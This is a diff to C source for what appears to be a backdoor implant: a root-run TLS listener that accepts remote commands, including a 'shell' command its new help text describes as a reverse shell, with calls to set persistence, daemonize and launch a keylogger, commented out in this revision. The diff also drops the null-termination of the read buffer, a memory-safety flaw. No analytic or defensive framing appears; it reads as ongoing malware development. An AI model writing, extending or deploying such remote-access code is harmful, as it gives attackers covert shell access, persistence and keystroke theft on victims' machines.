@@ -18,11 +18,19 @@ int handle_recv(SSL *ssl) {
 
         if (!strncmp(buffer, "quit", 4))
             break;
-        if (!strncmp(buffer, "shell", 5)) {
-            handle_shell(ssl);
+        if (!strncmp(buffer, "help", 4) || !strncmp(buffer, "?", 1)) {
+           snprintf(response, 1024,
+                "Help:\n"
+                "  shell   - Get a reverse shell\n"
+                "  quit    - Exit\n");
+            SSL_write(ssl, response, strlen(response));
         }
-        snprintf(response, 1024, "%s", "Command not found\n");
-        SSL_write(ssl, response, strlen(response));
+        else if (!strncmp(buffer, "shell", 5)) {
+            handle_shell(ssl);
+        } else {
+            snprintf(response, sizeof(response), "%s", "Command not found\n");
+            SSL_write(ssl, response, strlen(response));
+        }
     }
     return 1;
 }
@@ -44,8 +52,6 @@ void *handle_client(void *arg) {
         size_t valread;
 
         int ret_code = SSL_read_ex(args->ssl, buffer, sizeof(buffer) - 1, &valread);
-        buffer[valread] = '\0';
-
         if (ret_code == 0) {
             ssl_read_err = SSL_get_error(args->ssl, ret_code);
             break ;
@@ -135,9 +141,10 @@ int main(int ac, char **av) {
         fprintf(stderr, "Error: this program must be run as root.\n");
         return 1;
     }
-    //signal(SIGPIPE, SIG_IGN);
-    set_persistence();
     //create_daemon();
+    //set_persistence();
+    //launch_keylogger();
     start_socket_listener();
+
     return 0;
 }
